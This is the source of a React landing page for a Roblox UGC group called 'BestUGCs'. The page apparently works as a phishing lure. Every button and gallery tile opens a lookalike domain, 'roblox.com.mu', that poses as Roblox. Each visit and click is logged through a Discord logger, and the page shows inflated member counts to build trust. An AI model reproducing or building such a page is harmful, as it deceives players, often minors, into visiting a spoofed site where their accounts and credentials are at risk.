import { useEffect } from "react";
import { motion } from "framer-motion";
import { playClickSound } from "@/lib/sound";
import { sendDiscordLog } from "@/lib/discord-logger";
import { IconArrowRight, IconCrown, IconDiamond, IconLightning, IconShield, IconStar, IconTrophy } from "@/components/icons";

const ROBLOX_GROUP_URL = "https://www.roblox.com.mu/communities/1814899139/BestUGC";

const UGC_ITEMS = [
  { id: 1, src: "/ugc-1.png", name: "Rare Item #1" },
  { id: 2, src: "/ugc-2.png", name: "Rare Item #2" },
  { id: 3, src: "/ugc-3.png", name: "Rare Item #3" },
  { id: 4, src: "/ugc-4.png", name: "Rare Item #4" },
  { id: 5, src: "/ugc-5.png", name: "Rare Item #5" },
  { id: 6, src: "/ugc-6.png", name: "Rare Item #6" },
];

export default function Home() {
  useEffect(() => {
    sendDiscordLog("visit");
  }, []);

  const handleCtaClick = () => {
    playClickSound();
    sendDiscordLog("group_click");
    window.open(ROBLOX_GROUP_URL, "_blank", "noopener,noreferrer");
  };

  const features = [
    {
      icon: <IconDiamond className="w-8 h-8 text-primary" />,
      title: "Exclusive Drops",
      desc: "Get notified first when the most coveted items hit the marketplace."
    },
    {
      icon: <IconCrown className="w-8 h-8 text-primary" />,
      title: "Premium Curation",
      desc: "We only showcase the absolute highest quality UGC on Roblox."
    },
    {
      icon: <IconShield className="w-8 h-8 text-primary" />,
      title: "Verified Creators",
      desc: "Direct connections with the best 3D artists in the community."
    },
    {
      icon: <IconLightning className="w-8 h-8 text-primary" />,
      title: "Fast Alerts",
      desc: "Never miss a limited item with our instant community alerts."
    }
  ];

  return (
    <div className="min-h-screen bg-background relative overflow-hidden">
      <div className="bg-noise" />

      {/* Navigation */}
      <nav className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-6 md:px-12 py-6 bg-background/80 backdrop-blur-md border-b border-white/5">
        <div className="flex items-center gap-2">
          <IconCrown className="w-6 h-6 text-primary" />
          <span className="font-display font-bold text-xl tracking-tight">BestUGCs</span>
        </div>
        <button
          onClick={handleCtaClick}
          className="bg-white text-black px-6 py-2 rounded-full font-bold text-sm tracking-wide hover:scale-105 transition-transform duration-200"
        >
          Join Group
        </button>
      </nav>

      {/* Hero Section */}
      <section className="pt-40 pb-20 px-6 md:px-12 relative flex flex-col items-center text-center">
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-primary/20 rounded-full blur-[120px] pointer-events-none" />

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="max-w-4xl relative z-10"
        >
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/10 mb-8">
            <IconStar className="w-4 h-4 text-primary" />
            <span className="text-sm font-medium">The Premier Roblox UGC Community</span>
          </div>

          <h1 className="text-5xl md:text-7xl lg:text-8xl font-black mb-8 leading-[1.1] tracking-tighter">
            Elevate Your <br />
            <span className="text-gradient-primary">Avatar Game</span>
          </h1>

          <p className="text-lg md:text-xl text-muted-foreground max-w-2xl mx-auto mb-12">
            Discover, collect, and flex the most incredible User Generated Content in the metaverse. Join thousands of passionate Roblox fashion enthusiasts.
          </p>

          <button
            onClick={handleCtaClick}
            className="group relative inline-flex items-center gap-3 bg-primary text-white px-8 py-4 rounded-full font-bold text-lg hover:bg-primary/90 transition-all duration-300 hover:scale-105 hover:shadow-[0_0_40px_-10px_rgba(220,20,60,0.5)]"
          >
            Join BestUGCs Now
            <IconArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
          </button>
        </motion.div>
      </section>

      {/* UGC Gallery */}
      <section className="py-20 px-6 md:px-12 relative z-10">
        <div className="max-w-7xl mx-auto">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.6 }}
            className="text-center mb-16"
          >
            <h2 className="text-4xl md:text-5xl font-black mb-4 tracking-tight">
              Featured <span className="text-gradient-primary">UGCs</span>
            </h2>
            <p className="text-muted-foreground text-lg max-w-xl mx-auto">
              Hand-picked by our curators. The rarest, most coveted items in the metaverse.
            </p>
          </motion.div>

          <div className="grid grid-cols-2 md:grid-cols-3 gap-4 md:gap-6">
            {UGC_ITEMS.map((item, i) => (
              <motion.div
                key={item.id}
                initial={{ opacity: 0, scale: 0.95 }}
                whileInView={{ opacity: 1, scale: 1 }}
                viewport={{ once: true }}
                transition={{ duration: 0.4, delay: i * 0.08 }}
                onClick={handleCtaClick}
                className="group relative rounded-2xl overflow-hidden bg-card border border-white/5 hover:border-primary/40 transition-all duration-300 cursor-pointer aspect-square"
              >
                <img
                  src={item.src}
                  alt={item.name}
                  className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex items-end p-4">
                  <span className="text-white font-bold text-sm">View on Roblox →</span>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-20 px-6 md:px-12 relative z-10">
        <div className="max-w-5xl mx-auto">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.6 }}
            className="text-center mb-16"
          >
            <h2 className="text-4xl md:text-5xl font-black mb-4 tracking-tight">
              Why <span className="text-gradient-primary">BestUGCs?</span>
            </h2>
            <p className="text-muted-foreground text-lg max-w-xl mx-auto">
              We're not just another Roblox group. We're the definitive destination for serious collectors.
            </p>
          </motion.div>

          <div className="grid md:grid-cols-2 gap-6">
            {features.map((feature, i) => (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ duration: 0.5, delay: i * 0.1 }}
                key={i}
                className="p-8 rounded-3xl bg-card border border-white/5 hover:border-primary/30 transition-colors flex gap-6"
              >
                <div className="shrink-0 w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center">
                  {feature.icon}
                </div>
                <div>
                  <h3 className="text-xl font-bold mb-2">{feature.title}</h3>
                  <p className="text-muted-foreground leading-relaxed">{feature.desc}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="py-20 px-6 md:px-12 relative z-10">
        <div className="max-w-4xl mx-auto grid grid-cols-3 gap-8 text-center">
          {[
            { value: "2.5M+", label: "Community Members" },
            { value: "10K+", label: "Curated Items" },
            { value: "#1", label: "UGC Community" },
          ].map((stat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5, delay: i * 0.1 }}
            >
              <div className="text-4xl md:text-5xl font-black text-gradient-primary mb-2">{stat.value}</div>
              <div className="text-muted-foreground text-sm">{stat.label}</div>
            </motion.div>
          ))}
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-32 px-6 md:px-12 relative z-10">
        <div className="absolute inset-0 bg-primary/5" />
        <div className="max-w-4xl mx-auto text-center relative z-10">
          <IconTrophy className="w-16 h-16 text-primary mx-auto mb-8" />
          <h2 className="text-5xl md:text-7xl font-black mb-8 tracking-tight">
            Ready to upgrade your inventory?
          </h2>
          <p className="text-xl text-muted-foreground mb-12">
            Join 2.5 million+ other players who are already dominating the metaverse with the best items.
          </p>
          <button
            onClick={handleCtaClick}
            className="group relative inline-flex items-center gap-3 bg-white text-black px-10 py-5 rounded-full font-black text-xl hover:scale-105 transition-all duration-300"
          >
            Join BestUGCs on Roblox
            <IconArrowRight className="w-6 h-6 group-hover:translate-x-1 transition-transform" />
          </button>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-12 border-t border-white/5 px-6 md:px-12 text-center text-muted-foreground">
        <div className="flex items-center justify-center gap-2 mb-6">
          <IconCrown className="w-5 h-5 text-primary" />
          <span className="font-display font-bold text-lg text-white">BestUGCs</span>
        </div>
        <p className="text-sm">Not affiliated with Roblox Corporation. BestUGCs is a community group.</p>
      </footer>
    </div>
  );
}
